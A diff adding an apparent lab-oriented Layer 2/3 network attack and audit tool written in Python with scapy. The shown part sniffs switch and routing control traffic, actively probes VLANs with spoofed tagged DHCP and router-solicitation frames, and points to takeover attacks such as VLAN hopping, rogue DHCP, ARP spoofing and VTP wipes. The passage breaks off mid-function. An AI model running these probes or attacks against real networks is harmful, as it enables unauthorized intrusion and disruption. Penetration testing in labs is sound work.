@@ -1,0 +1,3281 @@
+#!/usr/bin/env -S uv run --quiet --script
+# /// script
+# requires-python = ">=3.10"
+# dependencies = ["scapy>=2.6", "rich>=13"]
+# ///
+"""
+l2l3-audit - L2/L3 security assessment & attack tool for an isolated lab network.
+
+Self-sufficient: run with `l2l3-audit <subcommand>` (uv bootstraps scapy on
+first run). Needs root for raw sockets: `sudo l2l3-audit <subcommand> ...`.
+
+Attack leg defaults to eth0 (-i). The watch leg is OPTIONAL (-w): scan
+and full use it for traversal evidence when present, ghost needs it;
+without it everything runs single-leg on the attack interface.
+
+The tool never assumes a VLAN, and the port never gets the benefit of
+the doubt: `scan` always auto-probes candidate VLANs (tagged and
+untagged vantages alike - the switch may be misconfigured; use
+--no-probe to stay passive). Leaks are enriched via `vlanenum`, VLANs
+hijacked via `vlanhop` (or per-attack --tag).
+"""
+
+import argparse
+import contextlib
+import hashlib
+import os
+import random
+import re
+import signal
+import struct
+import subprocess
+import sys
+import threading
+import time
+
+import ipaddress
+
+from rich.console import Console
+from rich.live import Live
+from rich.table import Table
+from rich.text import Text
+
+from scapy.all import (
+    Ether, Dot3, LLC, SNAP, Dot1Q, ARP, IP, UDP, BOOTP, DHCP, ICMP,
+    sendp, srp, sniff, get_if_hwaddr, get_if_addr, conf,
+    AsyncSniffer, Raw,
+)
+from scapy.layers.l2 import STP
+from scapy.layers.dns import DNS, DNSQR, DNSRR
+from scapy.layers.netbios import NBNSHeader, NBNSQueryRequest, NBNSQueryResponse
+from scapy.layers.inet6 import (
+    IPv6, ICMPv6ND_RA, ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6ND_RS,
+    ICMPv6NDOptRDNSS,
+    ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr,
+    IPv6ExtHdrDestOpt, IPv6ExtHdrFragment, fragment6,
+)
+from scapy.layers.dhcp6 import (
+    DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply,
+    DHCP6OptClientId, DHCP6OptServerId, DHCP6OptIA_NA, DHCP6OptIAAddress,
+    DHCP6OptDNSServers, DHCP6OptDNSDomains, DUID_LL,
+)
+from scapy.contrib.lldp import (
+    LLDPDU, LLDPDUChassisID, LLDPDUPortID, LLDPDUTimeToLive,
+    LLDPDUGenericOrganisationSpecific, LLDPDUEndOfLLDPDU,
+)
+
+try:
+    from scapy.layers.hsrp import HSRP
+    HAVE_HSRP = True
+except Exception:
+    HAVE_HSRP = False
+
+try:
+    from scapy.layers.vrrp import VRRP
+    HAVE_VRRP = True
+except Exception:
+    HAVE_VRRP = False
+
+console = Console()
+
+# scapy 2.7 renamed DHCP options: 53 "mtype" -> "mtype",
+# 6 "domain_name_server" -> "name_server". Derive the installed scapy's
+# builder name from the numeric option code so frames are well-formed on
+# either generation.
+def _dhcp_opt_name(code, fallback):
+    """Installed scapy's registered name for DHCP option `code`."""
+    try:
+        from scapy.layers.dhcp import DHCPOptions
+        v = DHCPOptions.get(code)
+        if isinstance(v, str):
+            return v
+        name = getattr(v, "name", None)
+        if isinstance(name, str):
+            return name
+    except Exception:
+        pass
+    return fallback
+
+
+DHCP_MT = _dhcp_opt_name(53, "mtype")
+DHCP_DNS = _dhcp_opt_name(6, "domain_name_server")
+
+
+# ---------------------------------------------------------------- helpers
+
+
+def die(msg):
+    print(f"[!] {msg}", file=sys.stderr)
+    sys.exit(1)
+
+
+def need_root():
+    if os.geteuid() != 0:
+        die("must run as root: sudo l2l3-audit <cmd>")
+
+
+def rand_mac():
+    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255)
+                                                 for _ in range(5))
+
+
+def parent_of(iface):
+    """eth0.1000 -> eth0 ; eth0 -> eth0"""
+    return iface.split(".")[0]
+
+
+def vlan_of(iface):
+    m = re.search(r"\.(\d+)$", iface)
+    return int(m.group(1)) if m else None
+
+
+def vlan_up(parent, vid):
+    """Create + raise an 802.1Q subinterface parent.vid. Returns name."""
+    sub = f"{parent}.{vid}"
+    if os.path.isdir(f"/sys/class/net/{sub}"):
+        return sub
+    r = subprocess.run(["ip", "link", "add", "link", parent, "name", sub,
+                        "type", "vlan", "id", str(vid)],
+                       capture_output=True, text=True)
+    if r.returncode != 0:
+        die(f"failed to create {sub}: {r.stderr.strip()}")
+    subprocess.run(["ip", "link", "set", sub, "up"], capture_output=True)
+    return sub
+
+
+def vlan_down(subif):
+    if os.path.isdir(f"/sys/class/net/{subif}"):
+        subprocess.run(["ip", "link", "del", subif], capture_output=True)
+
+
+def iface_exists(name):
+    """True when the kernel knows an interface by this name."""
+    return bool(name) and os.path.isdir(f"/sys/class/net/{name}")
+
+
+# Candidate set for active VLAN probing when nothing leaked passively:
+# common enterprise ids (default/mgmt/voice/print/guest/OT/quad helpers).
+DEFAULT_VLAN_PROBES = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 30, 40, 50, 99,
+                       100, 110, 120, 150, 200, 250, 300, 400, 500, 666,
+                       999, 1000, 1234, 2000, 3000, 4000, 4094)
+
+
+def dhcp_discover_addr(subif, timeout=15):
+    """Get an IPv4 address on subif via DHCP. Returns (ip, server) or
+    (None, None). Sniffs the wire ourselves; no dhclient dependency."""
+    mymac = my_mac(subif)
+    chaddr = int(mymac.replace(":", ""), 16).to_bytes(6, "big") + b"\x00" * 10
+    res = {"ip": None, "server": None}
+    xid = random.randint(0, 0xFFFFFFFF)
+
+    def hit(p):
+        if not (p.haslayer(BOOTP) and p.haslayer(DHCP)):
+            return
+        if p[BOOTP].xid != xid or p[BOOTP].op != 2:
+            return
+        mt = next((o[1] for o in p[DHCP].options
+                   if isinstance(o, tuple) and o[0] == DHCP_MT), None)
+        if mt == 2:  # OFFER -> REQUEST
+            res["ip"] = p[BOOTP].yiaddr
+            res["server"] = next((o[1] for o in p[DHCP].options
+                                  if isinstance(o, tuple)
+                                  and o[0] == "server_id"), p[IP].src)
+            req = (Ether(src=mymac, dst="ff:ff:ff:ff:ff:ff") /
+                   IP(src="0.0.0.0", dst="255.255.255.255") /
+                   UDP(sport=68, dport=67) /
+                   BOOTP(chaddr=chaddr, xid=xid) /
+                   DHCP(options=[(DHCP_MT, "request"),
+                                 ("requested_addr", res["ip"]),
+                                 ("server_id", res["server"]), "end"]))
+            sendp(req, iface=subif, verbose=0)
+        elif mt == 5 and res["ip"]:  # ACK
+            res["acked"] = True
+
+    sniffer = AsyncSniffer(iface=subif,
+                           filter="udp port 68 or udp port 67",
+                           prn=hit)
+    sniffer.start()
+    time.sleep(0.3)
+    disc = (Ether(src=mymac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=chaddr, xid=xid) /
+            DHCP(options=[(DHCP_MT, "discover"),
+                          ("param_req_list",
+                           [1, 3, 6, 51, 54, 121]), "end"]))
+    sendp(disc, iface=subif, verbose=0)
+    t0 = time.time()
+    while time.time() - t0 < timeout and not res.get("acked"):
+        time.sleep(0.2)
+    sniffer.stop()
+    if res.get("acked") and res["ip"]:
+        mask = "24"
+        subprocess.run(["ip", "addr", "add",
+                        f"{res['ip']}/{mask}", "dev", subif],
+                       capture_output=True)
+        return res["ip"], res["server"]
+    return None, None
+
+
+def net_of(iface):
+    """IPv4 CIDR configured on iface, for sweep defaults."""
+    out = subprocess.run(["ip", "-4", "-o", "addr", "show", "dev", iface],
+                         capture_output=True, text=True).stdout
+    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
+    if not m:
+        return None
+    return str(ipaddress.ip_network(f"{m.group(1)}/{m.group(2)}",
+                                    strict=False))
+
+
+def my_mac(iface):
+    return get_if_hwaddr(iface)
+
+
+def my_ip(iface):
+    try:
+        return get_if_addr(iface)
+    except Exception:
+        return "0.0.0.0"
+
+
+def set_ip_forward(on):
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("1" if on else "0")
+
+
+def get_ip_forward():
+    with open("/proc/sys/net/ipv4/ip_forward") as f:
+        return f.read().strip() == "1"
+
+
+def resolve_mac(ip, iface, retries=4, timeout=2):
+    for _ in range(retries):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                     iface=iface, timeout=timeout, verbose=0)
+        if ans:
+            return ans[0][1].hwsrc
+    return None
+
+
+def my_ll6(iface):
+    """Link-local IPv6 of iface; synthesize EUI-64 if missing."""
+    out = subprocess.run(["ip", "-6", "addr", "show", "dev", iface,
+                          "scope", "link"], capture_output=True,
+                         text=True).stdout
+    m = re.search(r"inet6 (fe80::[0-9a-f:]+)", out)
+    if m:
+        return m.group(1)
+    return ll6_from_mac(my_mac(iface))
+
+
+def ll6_from_mac(mac):
+    b = [int(x, 16) for x in mac.split(":")]
+    b[0] ^= 0x02
+    return "fe80::%02x%02x:%02xff:fe%02x:%02x%02x" % tuple(b)
+
+
+def gateway_of(iface):
+    out = subprocess.run(["ip", "route", "show", "default"],
+                         capture_output=True, text=True).stdout
+    for line in out.splitlines():
+        m = re.search(r"default via (\S+) dev (\S+)", line)
+        if m and (m.group(2) == iface or parent_of(m.group(2)) == parent_of(iface)):
+            return m.group(1)
+    m = re.search(r"default via (\S+)", out)
+    return m.group(1) if m else None
+
+
+def stop_loop(body):
+    """Run body(stop_flag: callable) until Ctrl-C."""
+    stop = {"flag": False}
+
+    def _sig(sig, frm):
+        stop["flag"] = True
+    signal.signal(signal.SIGINT, _sig)
+    body(lambda: stop["flag"])
+
+# ---------------------------------------------------------------- scan
+
+
+def parse_tlvs(payload):
+    """Generic Cisco-style TLV walker: type(2) len(2) value"""
+    out = []
+    i = 0
+    while i + 4 <= len(payload):
+        t, l = struct.unpack("!HH", payload[i:i + 4])
+        if l < 4 or i + l > len(payload):
+            break
+        out.append((t, payload[i + 4:i + l]))
+        i += l
+    return out
+
+
+def scan_cmd(args):
+    need_root()
+    if not iface_exists(args.iface):
+        die(f"interface {args.iface} does not exist")
+    pif = parent_of(args.iface)
+    watch = getattr(args, "watch", None)
+    legs = [args.iface]
+    if watch:
+        if iface_exists(watch):
+            legs.append(watch)
+        else:
+            print(f"[!] watch interface {watch} not present - continuing "
+                  "single-leg on the attack interface")
+    # sniff parents only: a parent sees every tagged frame its
+    # subinterfaces see, so adding children would double-count.
+    ifaces = sorted({parent_of(i) for i in legs})
+    seen = {"stp": [], "cdp": {}, "dtp": 0, "vtp": set(), "lldp": 0,
+            "hsrp": {}, "vrrp": {}, "dhcp_srv": set(),
+            "arp": {}, "conflicts": set(), "hosts": set(), "vlans": set(),
+            "ospf": 0, "ospf_auth": {}, "eigrp": 0, "mvrp": 0,
+            "macsec": 0, "bad_rdnss": set(), "frag_nd": 0, "ra6": 0,
+            "vtp_rev": None}
+
+    announced = set()
+
+    def announce(tag, msg):
+        """One-shot intermediate status when a protocol is first seen."""
+        if tag not in announced:
+            announced.add(tag)
+            console.print(f"    [cyan]+[/cyan] {msg}")
+
+    def ctl(dp):
+        """Control-plane protocols parsed as 802.3/LLC."""
+        if dp.haslayer(STP):
+            s = dp[STP]
+            seen["stp"].append((s.rootmac, s.rootid, s.bridgemac))
+            announce("stp", f"STP BPDU: root {s.rootmac}")
+            return
+        if dp.haslayer(SNAP):
+            sn = dp[SNAP]
+            oui = getattr(sn, "OUI", 0)
+            body = bytes(sn.payload)
+            if oui == 0x00000C and sn.code == 0x2000:  # CDP
+                announce("cdp", "CDP disclosure frames")
+                hdr = body[:4]  # version, ttl, cksum
+                for t, v in parse_tlvs(body[4:]):
+                    if t == 0x0001:
+                        seen["cdp"]["device"] = v.decode(errors="replace")
+                    elif t == 0x0003:
+                        seen["cdp"]["port"] = v.decode(errors="replace")
+                    elif t == 0x0005:
+                        seen["cdp"]["ios"] = v.decode(errors="replace"
+                                                      ).splitlines()[0][:80]
+                    elif t == 0x0006:
+                        seen["cdp"]["platform"] = v.decode(errors="replace")
+                    elif t == 0x000A and len(v) >= 2:
+                        seen["cdp"]["native_vlan"] = struct.unpack("!H", v[:2])[0]
+                    elif t == 0x000E and len(v) >= 3:
+                        seen["cdp"]["voice_vlan"] = struct.unpack("!H",
+                                                                  v[-2:])[0]
+            elif oui == 0x00000C and sn.code == 0x2004:  # DTP
+                seen["dtp"] += 1
+                announce("dtp", "DTP trunk-negotiation frames")
+            elif oui == 0x00000C and sn.code == 0x2003:  # VTP
+                if len(body) > 5:
+                    dlen = body[3]
+                    if 0 < dlen <= 32 and 4 + dlen <= len(body):
+                        dom = body[4:4 + dlen].decode(errors="replace"
+                                                      ).strip("\x00")
+                        if dom:
+                            seen["vtp"].add(dom)
+                            announce(f"vtp-{dom}", f"VTP domain '{dom}'")
+                if len(body) >= 40 and body[1] == 0x01:  # summary advert
+                    seen["vtp_rev"] = struct.unpack("!I", body[36:40])[0]
+
+    def pkt(p):
+        try:
+            dp = Dot3(bytes(p))
+        except Exception:
+            dp = p
+        ctl(dp)
+        # --- Ether-typed protocols
+        if p.haslayer(Ether) and p[Ether].type == 0x88CC:
+            seen["lldp"] += 1
+            announce("lldp", "LLDP topology disclosure")
+        if HAVE_HSRP and p.haslayer(HSRP):
+            h = p[HSRP]
+            seen["hsrp"][h.group] = (h.priority, h.virtualIP, h.state)
+            announce(f"hsrp-{h.group}",
+                     f"HSRP group {h.group} vip {h.virtualIP}")
+        if p.haslayer(IP):
+            if p[IP].proto == 89 and p[IP].dst in ("224.0.0.5", "224.0.0.6"):
+                seen["ospf"] += 1
+                announce("ospf", f"OSPF routing traffic from {p[IP].src}")
+                raw = bytes(p[IP].payload)
+                if len(raw) >= 18:
+                    autype = struct.unpack("!H", raw[16:18])[0]
+                    seen["ospf_auth"].setdefault(
+                        {0: "null", 1: "cleartext"}.get(autype, f"type{autype}"),
+                        p[IP].src)
+            elif p[IP].proto == 88 and p[IP].dst == "224.0.0.10":
+                seen["eigrp"] += 1
+                announce("eigrp", "EIGRP routing traffic")
+            if p[IP].proto == 112 and p[IP].dst == "224.0.0.18":
+                if HAVE_VRRP and p.haslayer(VRRP):
+                    v = p[VRRP]
+                    vips = [str(a) for a in v.addrlist] if v.addrlist else []
+                    seen["vrrp"][v.vrid] = (v.priority, p[IP].src, vips)
+                    announce(f"vrrp-{v.vrid}",
+                             f"VRRP vrid {v.vrid} master {p[IP].src}")
+                else:
+                    seen["vrrp"][None] = (None, p[IP].src, [])
+            if p.haslayer(DHCP):
+                for opt in p[DHCP].options:
+                    if isinstance(opt, tuple) and opt[0] == DHCP_MT \
+                            and opt[1] == 2:
+                        seen["dhcp_srv"].add(p[IP].src)
+                        announce(f"dhcp-{p[IP].src}",
+                                 f"DHCP server offering from {p[IP].src}")
+        if p.haslayer(ARP):
+            a = p[ARP]
+            if a.op == 2:
+                seen["hosts"].add((a.psrc, a.hwsrc))
+                announce("arp", f"first host: {a.psrc} is-at {a.hwsrc}")
+                if a.psrc in seen["arp"] and seen["arp"][a.psrc] != a.hwsrc:
+                    seen["conflicts"].add((a.psrc, seen["arp"][a.psrc],
+                                           a.hwsrc))
+                seen["arp"][a.psrc] = a.hwsrc
+        # --- 802.1Q/QinQ tags leaking onto this leg (stacked tags walked)
+        lay = p
+        while lay is not None and lay.name != "NoPayload":
+            if lay.name in ("Dot1Q", "Dot1AD") and hasattr(lay, "vlan"):
+                seen["vlans"].add(lay.vlan)
+                announce(f"vlan-{lay.vlan}",
+                         f"802.1Q tag VLAN {lay.vlan} on the wire")
+            lay = lay.payload
+        # --- MVRP / MACsec presence (data-plane protection posture)
+        if p.haslayer(Ether):
+            if p[Ether].type == 0x88F5:
+                seen["mvrp"] += 1
+                announce("mvrp", "MVRP/GVRP dynamic-VLAN traffic")
+            elif p[Ether].type == 0x88E5:
+                seen["macsec"] += 1
+                announce("macsec", "MACsec-secured frames (802.1AE)")
+        # --- CVE-class ND anomalies (Bad Neighbor 16898 / 24086 / 38063):
+        # even-length RDNSS, option-length overrun, fragmented ND
+        if p.haslayer(ICMPv6ND_RA):
+            seen["ra6"] += 1
+            announce("ra6", f"IPv6 Router Advertisement from "
+                            f"{p[IPv6].src if p.haslayer(IPv6) else '?'}")
+            opts = bytes(p[ICMPv6ND_RA].payload)
+            off = 0
+            while off + 2 <= len(opts):
+                t = opts[off]
+                ln = opts[off + 1]
+                if ln == 0 or off + ln * 8 > len(opts):
+                    seen["bad_rdnss"].add(
+                        f"opt-len overrun type={t} from "
+                        f"{p[IPv6].src if p.haslayer(IPv6) else '?'}")
+                    break
+                if t == 0x19 and ln % 2 == 0:
+                    src6 = p[IPv6].src if p.haslayer(IPv6) else "?"
+                    seen["bad_rdnss"].add(
+                        f"EVEN RDNSS length ({ln}) from {src6} - "
+                        "CVE-2020-16898-style option confusion probe")
+                off += ln * 8
+        if p.haslayer(IPv6) and p[IPv6].nh == 44:
+            seen["frag_nd"] += 1
+            announce("fragnd", "fragmented ND frame (RFC 6980 drop)")
+
+    print(f"[*] passively listening {args.time}s on: {', '.join(ifaces)}")
+    sniff(iface=ifaces, timeout=args.time, store=False, prn=pkt)
+
+    # -------- active VLAN probing --------
+    # The port never gets the benefit of the doubt. Whether the vantage
+    # is untagged or already tagged on VLAN x, every candidate VLAN is
+    # asked by name from the physical parent: only a correctly bounded
+    # access port drops all of it; an open trunk / hybrid port / missing
+    # pruning answers back. Classic VLAN-hopping research (switch
+    # spoofing / double tagging, frogger & VoIP-hopper leak harvesting)
+    # hinges on exactly the misconfigs this probes for.
+    probe = None
+    if not getattr(args, "no_probe", False):
+        spec = getattr(args, "probe_vlans", None)
+        window = getattr(args, "probe_time", 6)
+        cands = parse_vlan_list(spec) if spec else sorted(
+            set(DEFAULT_VLAN_PROBES) | set(seen["vlans"])
+            | {v for v in (seen["cdp"].get("native_vlan"),
+                           seen["cdp"].get("voice_vlan")) if v})
+        print(f"[*] active: probing {len(cands)} candidate VLAN(s) from "
+              f"{pif} ({window}s window; tagged DHCP+RS per VID, "
+              "one untagged native Discover)")
+        probe = active_vlan_probe(pif, cands, window)
+
+    print("\n================ L2/L3 FINDINGS ================")
+
+    def hi(m):
+        print(f"  [HIGH] {m}")
+
+    def med(m):
+        print(f"  [MED ] {m}")
+
+    def info(m):
+        print(f"  [INFO] {m}")
+
+    any_find = False
+    if seen["stp"]:
+        any_find = True
+        roots = {str(r[0]) for r in seen["stp"]}
+        hi(f"STP BPDUs visible ({len(seen['stp'])}). Root MAC(s): "
+           f"{', '.join(roots)}. Root takeover feasible w/o Root/BPDU Guard "
+           f"-> stproot")
+    if seen["dtp"]:
+        any_find = True
+        hi(f"DTP frames seen ({seen['dtp']}). Trunk negotiation open -> VLAN "
+           f"hopping -> dtp, doubletag")
+    if seen["cdp"]:
+        any_find = True
+        med(f"CDP disclosure: {seen['cdp']}")
+    if seen["vtp"]:
+        any_find = True
+        med(f"VTP domain(s): {', '.join(sorted(seen['vtp']))} - VTP injection "
+            f"can wipe the VLAN db (yersinia VTP attack)")
+    if seen["lldp"]:
+        any_find = True
+        med(f"LLDP frames seen ({seen['lldp']}) - topology disclosure")
+    if seen["hsrp"]:
+        any_find = True
+        for g, (prio, vip, state) in seen["hsrp"].items():
+            hi(f"HSRP group {g}: prio={prio} vip={vip} state={state} -> "
+               f"takeover: hsrp --vip {vip} --group {g}")
+    if seen["vrrp"]:
+        any_find = True
+        for vrid, (prio, src, vips) in seen["vrrp"].items():
+            hi(f"VRRP vrid {vrid}: master {src} prio {prio} vip(s) "
+               f"{', '.join(vips) or '?'} -> takeover: "
+               f"vrrp --vrid {vrid} --vip {' '.join(vips) or '<ip>'}")
+    if seen["dhcp_srv"]:
+        any_find = True
+        info(f"DHCP server(s): {', '.join(sorted(seen['dhcp_srv']))}. "
+             f"-> dhcpstarve | roguedhcp")
+    if seen["vlans"]:
+        any_find = True
+        hi(f"802.1Q tags observed on wire: VLAN(s) "
+           f"{', '.join(str(v) for v in sorted(seen['vlans']))} reachable "
+           f"from this port -> vlanhop --vlan <id>")
+    if probe is not None:
+        stats, native = probe
+        myvlan = vlan_of(args.iface)
+        where = ("untagged port" if myvlan is None
+                 else f"port tagged VLAN {myvlan} on our side")
+        proven = [(v, s) for v, s in stats.items() if s["offer"]]
+        weaker = [(v, s) for v, s in stats.items()
+                  if not s["offer"] and (s["frames"] or s["ra"])]
+        for v, s in sorted(proven):
+            any_find = True
+            if v == myvlan:
+                info(f"active probe: VLAN {v} DHCP answered on the "
+                     "assigned tag - placement confirmed (not an "
+                     "overflow)")
+            else:
+                hi(f"active probe: VLAN {v} REACHABLE from this "
+                   f"{where} - tagged DHCP Discover answered by "
+                   f"{s['offer']}: port carries an unplanned broadcast "
+                   "domain (open trunk / hybrid / pruning absent - "
+                   f"misconfig) -> vlanhop --vlan {v}")
+        for v, s in sorted(weaker):
+            any_find = True
+            srcs = (f" from {', '.join(sorted(s['srcs']))}"
+                    if s["srcs"] else "")
+            med(f"active probe: VLAN {v} leaking onto this {where} - "
+                f"{s['frames']} tagged frame(s) + {s['ra']} RA(s){srcs} "
+                "in the window; bidirectional reachability unproven "
+                f"-> retry: vlanhop --vlan {v} --static ...")
+        if native is not None and native["offer"]:
+            any_find = True
+            med(f"active probe: untagged/native VLAN answered DHCP "
+                f"({native['offer']})"
+                + (" although operating on a tagged subinterface - the "
+                   "parent still passes untagged frames (hybrid port)"
+                   if myvlan is not None else ""))
+        if not proven and not weaker and \
+                not (native and native["offer"]):
+            info("active probe: no candidate VLAN answered - port "
+                 "behaves as a correctly bounded access port (or no "
+                 "DHCP/routers there; widen with --probe-vlans)")
+    if seen["cdp"].get("voice_vlan"):
+        any_find = True
+        hi(f"voice VLAN (VVID {seen['cdp']['voice_vlan']}) leaked via CDP "
+           "appliance TLV; voice ports are trusted-for-phones and rarely "
+           "802.1Xed -> voicevlan")
+    if seen["ospf"]:
+        any_find = True
+        med(f"OSPF visible ({seen['ospf']} msgs); auth= "
+            + ", ".join(f"{k} from {v}" for k, v in seen['ospf_auth'].items()
+                        ) or "unknown; null/cleartext = LSA injection "
+            "surface (Nakibly/NDSS12; fight-back-resistant false self-LSA)")
+    if seen["eigrp"]:
+        any_find = True
+        med(f"EIGRP visible ({seen['eigrp']} msgs); if no MD5 auth TLV: "
+            "route/neighbour injection surface (FRR/scapy-contrib)")
+    if seen["mvrp"]:
+        any_find = True
+        hi(f"MVRP/GVRP active ({seen['mvrp']} frames) - dynamic VLAN "
+           "registration open -> mvrp --join (no public tool exists)")
+    if seen["macsec"]:
+        info(f"MACsec deployed ({seen['macsec']} frames 0x88E5) - check "
+             "fail-open policy: plain frames accepted? (802.1AE posture)")
+    for w in sorted(seen["bad_rdnss"]):
+        any_find = True
+        hi(f"malformed ICMPv6 RA option stream: {w} "
+           "(Bad-Neighbor/24086/38063 class)")
+    if seen["frag_nd"]:
+        any_find = True
+        hi(f"{seen['frag_nd']} fragmented ND frame(s) - RFC 6980 says "
+           "receivers MUST drop; presence = RA-Guard/frag confusion surface "
+           "-> raguard")
+    if seen["vtp_rev"] is not None:
+        info(f"VTP config revision observed: {seen['vtp_rev']} - feed it "
+             "to: vtp (safe rev+1 proof; --wipe needs --i-know)")
+    if seen["vtp"]:
+        info("next: vtp  (summary rev+1 takeover probe, answer never by "
+             "default)")
+    for c in seen["conflicts"]:
+        any_find = True
+        hi(f"ARP conflict {c[0]}: {c[1]} vs {c[2]} (active spoofing?)")
+    info(f"ARP hosts observed: {len(seen['hosts'])}")
+    for ip, mac in sorted(seen["hosts"]):
+        print(f"         {ip:<16} {mac}")
+    if not any_find:
+        info("no control-plane frames seen; try arpsweep to enumerate hosts")
+    print("\n[*] vlan: vlanenum | vlanhop | voicevlan | dtp | doubletag | "
+          "mvrp\n"
+          "[*] l2:   portsteal | ghost | stproot | camflood | gratarp\n"
+          "[*] l3:   arpspoof | roguedhcp | dhcpstarve | hsrp | vrrp | "
+          "icmpredirect\n"
+          "[*] v6:   roguera | ndpspoof | roguedhcp6 | raguard | daddos\n"
+          "[*] proto: vtp | llmnr | scan")
+    return seen
+
+# ---------------------------------------------------------------- vlanenum
+
+
+def parse_vlan_list(spec):
+    """'1,2,10-20,1000' -> sorted set of ints"""
+    out = set()
+    for part in spec.split(","):
+        part = part.strip()
+        if "-" in part:
+            a, b = part.split("-", 1)
+            out.update(range(int(a), int(b) + 1))
+        elif part:
+            out.add(int(part))
+    bad = [v for v in out if not 1 <= v <= 4094]
+    if bad:
+        die(f"invalid VLAN ids: {bad}")
+    return sorted(out)
+
+
+def active_vlan_probe(pif, vids, window, probe_native=True):
+    """Ask candidate VLANs by name from the PHYSICAL parent: per VID a
+    tagged DHCP Discover (xid -> VID fingerprint) plus a tagged IPv6
+    Router Solicitation, and one untagged Discover for the native VLAN.
+    Works the same whether our vantage is untagged or already on a
+    tagged subinterface: a correctly bounded switch port drops every
+    one of these frames, so anything answering is a misconfiguration
+    (open trunk, hybrid port, missing allowed-VLAN pruning) - exactly
+    the case we must not take the port's word on.
+
+    Returns (stats, native):
+      stats[vid] = {"offer": dhcp server ip or None, "frames": n tagged
+                    frames seen on this VID in the window, "ra": n,
+                    "srcs": {macs}}
+      native     = {"offer": dhcp server ip or None} or None.
+    A DHCP OFFER matching our per-VID xid PROVES bidirectional
+    reachability; tagged ambient frames / RAs are weaker leak evidence.
+    """
+    xids = {}
+    ours = {my_mac(pif).lower()}
+    stats = {v: {"offer": None, "frames": 0, "ra": 0, "srcs": set()}
+             for v in vids}
+    native = {"offer": None, "xid": None} if probe_native else None
+
+    def msgtype(p):
+        return next((o[1] for o in p[DHCP].options
+                     if isinstance(o, tuple) and o[0] == DHCP_MT), None)
+
+    def matcher(p):
+        if not p.haslayer(Ether) or p[Ether].src.lower() in ours:
+            return
+        q = p.getlayer(Dot1Q)
+        if p.haslayer(BOOTP) and p.haslayer(DHCP) and p[BOOTP].op == 2:
+            vid = xids.get(p[BOOTP].xid)
+            if p[BOOTP].xid in xids and msgtype(p) == 2:
+                srv = p[IP].src if p.haslayer(IP) else "?"
+                if vid is None and native is not None:
+                    native["offer"] = srv
+                elif vid in stats:
+                    stats[vid]["offer"] = srv
+        if q is None or q.vlan not in stats:
+            return
+        s = stats[q.vlan]
+        s["srcs"].add(p[Ether].src.lower())
+        if p.haslayer(ICMPv6ND_RA):
+            s["ra"] += 1
+        else:
+            s["frames"] += 1
+
+    sn = AsyncSniffer(iface=pif, prn=matcher)
+    sn.start()
+    for v in vids:
+        mac = rand_mac()
+        ours.add(mac.lower())
+        xid = random.randint(0, 0xFFFFFFFF)
+        xids[xid] = v
+        chaddr = int(mac.replace(":", ""), 16).to_bytes(6, "big") + \
+            b"\x00" * 10
+        disc = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                Dot1Q(vlan=v) /
+                IP(src="0.0.0.0", dst="255.255.255.255") /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=chaddr, xid=xid) /
+                DHCP(options=[(DHCP_MT, "discover"), "end"]))
+        rs = (Ether(src=mac, dst="33:33:00:00:00:02") /
+              Dot1Q(vlan=v) /
+              IPv6(src=ll6_from_mac(mac), dst="ff02::2", hlim=255) /
+              ICMPv6ND_RS() /
+              ICMPv6NDOptSrcLLAddr(lladdr=mac))
+        sendp([disc, rs], iface=pif, verbose=0)
+    if native is not None:
+        mac = rand_mac()
+        ours.add(mac.lower())
+        native["xid"] = random.randint(0, 0xFFFFFFFF)
+        xids[native["xid"]] = None
+        chaddr = int(mac.replace(":", ""), 16).to_bytes(6, "big") + \
+            b"\x00" * 10
+        sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+              IP(src="0.0.0.0", dst="255.255.255.255") /
+              UDP(sport=68, dport=67) /
+              BOOTP(chaddr=chaddr, xid=native["xid"]) /
+              DHCP(options=[(DHCP_MT, "discover"), "end"]),
+              iface=pif, verbose=0)
+    time.sleep(window)
+    sn.stop()
+    return stats, native
+
+
+def vlanenum_cmd(args):
+    """Discover tagged VLANs reachable from this port: passive (leaks) +
+    optional active tagged probes (gaps G1)."""
+    need_root()
+    pif = parent_of(args.iface)
+    print(f"[*] VLAN enumeration on {pif} (port never assumed tagged)")
+
+    found = {"tags": {}, "cdp_native": None, "cdp_voice": None,
+             "lldp_pvid": None, "vtp": {}, "pvst": set(), "dtp": 0,
+             "dhcp6": set()}
+
+    def ctl_vtp(body):
+        """VTP subset-adv parse: pull every VLAN id+name in the DB."""
+        if len(body) < 42 or body[1] != 0x02:  # code 0x02 = subset adv
+            return
+        off = 40 + 4  # hdr(40: ver,code,seq,remlen+domain32) + rev(4)
+        while off < len(body):
+            if off + 4 > len(body):
+                break
+            vlen = body[off]
+            if vlen < 12 or off + vlen > len(body):
+                break
+            vid = struct.unpack("!H", body[off + 4:off + 6])[0]
+            nlen = body[off + 3]
+            name = body[off + 12:off + 12 + min(nlen, vlen - 12)]
+            found["vtp"][vid] = name.decode(errors="replace")
+            off += (vlen + 3) & ~3
+
+    def pkt(p):
+        # stacked tag walk
+        lay = p
+        while lay is not None and lay.name != "NoPayload":
+            if lay.name in ("Dot1Q", "Dot1AD") and hasattr(lay, "vlan"):
+                found["tags"][lay.vlan] = \
+                    found["tags"].get(lay.vlan, 0) + 1
+            lay = lay.payload
+        try:
+            dp = Dot3(bytes(p))
+        except Exception:
+            dp = p
+        if dp.haslayer(SNAP):
+            sn = dp[SNAP]
+            body = bytes(sn.payload)
+            if getattr(sn, "OUI", 0) == 0x00000C:
+                if sn.code == 0x2000:  # CDP
+                    for t, v in parse_tlvs(body[4:]):
+                        if t == 0x000A and len(v) >= 2:
+                            found["cdp_native"] = struct.unpack("!H",
+                                                                v[:2])[0]
+                        elif t == 0x000E:      # Appliance VLAN (voice)
